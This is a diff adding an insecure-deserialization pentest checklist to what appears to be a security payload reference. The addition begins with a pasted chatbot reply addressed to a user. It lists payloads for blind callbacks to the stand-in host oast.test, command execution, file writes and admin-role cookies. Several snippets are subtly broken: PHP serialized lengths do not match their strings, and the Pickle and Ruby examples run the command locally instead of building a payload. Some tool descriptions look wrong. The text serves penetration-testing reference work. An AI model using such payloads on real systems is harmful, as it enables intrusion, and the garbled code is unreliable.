@@ -1237,6 +1237,175 @@ Check the following sub-sections, located in other chapters :
 | Python Pickle   | 80 04 95     | gASV            |
 | PHP Serialized  | 4F 3A        | Tz              |
 
+Absolutely, Anvesh. Based on your repo structure and the methodology outlined in your pilot testing doc, here’s a comprehensive, GitHub-ready Markdown checklist covering **insecure deserialization** across common formats and platforms:
+
+---
+
+## 🧨 Insecure Deserialization – Pentest Checklist
+
+### 🔍 Identification Criteria
+- ✅ Application accepts serialized data (JSON, XML, binary, etc.)
+- ✅ Deserialization occurs without integrity checks or class whitelisting
+- ✅ Stack traces or error messages reveal deserialization libraries
+- ✅ Presence of known serialization formats (e.g., `rO0AB`, `O:`, `a:`, `b'aced'`)
+
+---
+
+### 🧪 Fuzzable Entry Points
+
+```text
+session, token, data, payload, object, blob, state, config, user, profile, settings, preferences, export, import, backup, restore, message, request, response, cache, cookie
+```
+
+---
+
+### 🛠️ Tooling Suggestions
+
+| Tool | Purpose |
+|------|---------|
+| [ysoserial](https://github.com/frohoff/ysoserial) | Java gadget chain generation |
+| [PHPGGC](https://github.com/ambionics/phpggc) | PHP gadget chains |
+| [SerialKiller](https://github.com/NetSPI/SerialKiller) | .NET deserialization testing |
+| [Burp Deserialization Scanner](https://github.com/PortSwigger/deserialization-scanner) | Passive detection |
+| [Hackvertor](https://portswigger.net/bappstore/3e8c6e0d7f4a4e2c9e6b8f5b4e8c6e0d) | Encoding/decoding payloads |
+
+---
+
+**1. Blind Callback via Deserialization**  
+Trigger DNS/HTTP exfiltration to confirm deserialization execution.
+
+```java
+// Java (ysoserial - CommonsCollections1)
+Payload: http://oast.test/ping
+
+// PHP
+O:8:"Exploit":1:{s:4:"ping";s:33:"http://oast.test/ping.jpg";}
+
+// JSON (Jackson)
+{"@type":"java.net.URL","val":"http://oast.test/callback"}
+```
+
+---
+
+**2. File Write via Gadget Chain**  
+Write arbitrary file to disk during deserialization.
+
+```java
+// ysoserial - FileOutputStream chain
+Creates: /tmp/proof.txt
+
+// PHPGGC - Monolog/RCE1
+Writes: /tmp/success.txt with attacker-controlled content
+```
+
+---
+
+**3. Remote Command Execution**  
+Execute system commands via deserialization gadgets.
+
+```java
+// ysoserial - ProcessBuilder
+Payload: `whoami`
+
+// PHPGGC - SwiftMailer/Fwrite
+Payload: `uname -a`
+
+// JSON (Spring Boot)
+{"@type":"java.lang.ProcessBuilder","command":["id"]}
+```
+
+---
+
+**4. Time-Based Blind Execution**  
+Use sleep/delay to confirm code execution.
+
+```java
+// Java
+${T(java.lang.Thread).sleep(5000)}
+
+// PHP
+O:8:"Exploit":1:{s:4:"cmd";s:5:"sleep";}
+
+// Python (Pickle)
+pickle.loads with time.sleep(5)
+```
+
+---
+
+**5. Logic Bypass via Type Confusion**  
+Replace expected object type to bypass validation.
+
+```php
+// Replace expected `User` with `stdClass`
+O:8:"stdClass":1:{...}
+
+// JSON
+{"@type":"com.fasterxml.jackson.databind.node.ObjectNode","x":1}
+```
+
+---
+
+**6. Malformed Blob Crash**  
+Trigger parser exceptions with corrupted payloads.
+
+```java
+// Truncated blob
+Payload: `rO0A....`
+
+// PHP
+O:8:"Broken":3:{s:4:"x";i:2; => malformed structure
+```
+
+---
+
+**7. Unsafe XML Deserialization**  
+Inject objects via XML parsers that support class loading.
+
+```xml
+<object class="java.lang.Runtime">
+  <method>getRuntime().exec("calc.exe")</method>
+</object>
+```
+
+---
+
+**8. Python Pickle RCE**  
+Exploit unsafe `pickle.loads()` usage.
+
+```python
+import pickle, os
+payload = pickle.dumps(os.system('id'))
+```
+
+---
+
+**9. Ruby Marshal RCE**  
+Exploit unsafe `Marshal.load()` usage.
+
+```ruby
+Marshal.dump(`id`)
+```
+
+---
+
+**10. Cache Poisoning via Deserialization**  
+Inject serialized blob into Redis/Memcached.
+
+```java
+// Poisoned object stored under known key
+Retrieval triggers deserialization and execution
+```
+
+---
+
+**11. Cookie-Based Deserialization**  
+Embed serialized object in session or JWT cookie.
+
+```php
+// Encoded session cookie
+O:8:"Exploit":1:{s:4:"role";s:5:"admin";}
+```
+
 ## POP Gadgets
 
 > A POP (Property Oriented Programming) gadget is a piece of code implemented by an application's class, that can be called during the deserialization process.
